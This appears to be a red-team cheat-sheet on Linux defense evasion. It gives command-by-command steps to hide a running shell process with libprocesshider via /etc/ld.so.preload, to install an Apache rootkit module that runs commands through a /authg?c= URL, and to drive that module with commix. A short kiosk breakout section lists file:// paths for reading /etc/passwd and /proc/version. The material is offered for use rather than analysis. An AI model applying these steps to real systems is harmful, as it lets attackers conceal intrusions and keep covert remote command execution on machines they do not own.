# Linux bypass Restriction

***

## Hiding Linux Process

### Libprocesshider

1. git clone <https://github.com/gianlucaborello/libprocesshider>
2. Nano processhider.c
    ○ Change process_to_filter = nss_shell.py
3. Make
4. Mv libprocesshider.so /usr/local/lib
5. Echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
6. ./nss_shell 192.168.1.46 2222
7. Ps -aux

## Linux Red Team Defense Evasion - Rootkits

### apache Rootkit

1. sudo apt-get install apache2-dev

2. Cd /tmp
   3.git clone <https://github.com/ChristianPapathanasiou/apache-rootkit.git>

3. cd apache-rootkit

4. apxs -c -i mod_authg.c

5. vim /etc/apache2/apache2.conf
   
   * LoadModule authg_module /usr/lib/apache2/modules
   * mod_authg.so

```
<Location /authg>
SetHandler authg
</Location>
```

<http://192.168.1.46/authg?c=whoami>

commix -u <http://192.168.1.46/authg?c=whoami>

## Download and Upload file

## Kiosk BreakOuts

Interactive kiosks620 are computer systems that are generally intended to be used by the public for tasks such as Internet browsing, registration, or information retrieval. They are commonly installed in the lobbies of corporate buildings, in airports and retail establishments, and in various other locations.

* Command injection
  * file://etc/passwd
  * file://proc/version
